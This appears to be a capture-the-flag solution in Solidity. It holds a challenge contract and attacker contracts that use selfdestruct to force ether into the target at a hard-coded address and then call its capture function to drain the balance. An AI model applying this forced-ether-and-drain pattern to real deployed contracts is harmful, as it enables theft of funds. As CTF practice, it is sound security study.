/**
Capture the flag challenge*/

pragma solidity 0.4.24;

contract Flag {
    mapping (address => bool) public captured;
   
    function getBal()
    public
    view
    returns (uint)
    {
        return address(this).balance;
    }

    event LogSneakedUpOn(address indexed who, uint howMuch);
    event LogCaptured(address indexed who, bytes32 braggingRights);

    constructor() payable public {
    }

    function sneakUpOn() public payable {
        emit LogSneakedUpOn(msg.sender, msg.value);
        msg.sender.transfer(msg.value);
    }

    function capture(bytes32 braggingRights) public {
        require(address(this).balance > 0);
        captured[msg.sender] = true;
        emit LogCaptured(msg.sender, braggingRights);
        msg.sender.transfer(address(this).balance);
    }
}

contract Retrieve{
    Flag f = Flag(address(0x3213f37e64922EBf2e97ed710C335CA4A69c0bA0));
    address owner;
    constructor() payable public {
        owner = msg.sender;
    }
   
    function set(address _f) public payable{
        f = Flag(_f);
    }
   
    function goodbye()
    public
    payable
    {
        require(msg.sender==owner);
        bytes32 a = "Hello! Lubin here :)";
        f.capture(a);
    }
   
    function sneak()
    public
    payable
    {
        f.sneakUpOn.value(msg.value)();
    }
   
    function withdraw()
    public{
        require(msg.sender==owner);
        owner.transfer(address(this).balance);
       
    }
   
    function query() public view returns (uint){
        return address(f).balance;
    }
   
    function () external payable{}
   
}

contract Test{
    address public f = address(0x3213f37e64922EBf2e97ed710C335CA4A69c0bA0);
   
    function getBal()
    public
    view
    returns (uint)
    {
        return address(this).balance;
    }
   
    constructor() payable public {}

    function set(address _f) public payable{
        f = _f;
    }

   
    function send()
        payable
        public
    {
        selfdestruct(f);
    }
}

// contract Flag2 {
   
//     Flag f;

//     constructor() public {
//     }
   
//     function makeF(address fAddr)
//         public
//     {
//         f = Flag(fAddr);
//     }
   
//     function sendF()
//         payable
//         public
//     {
//         f.transfer(msg.value);
//     }

// }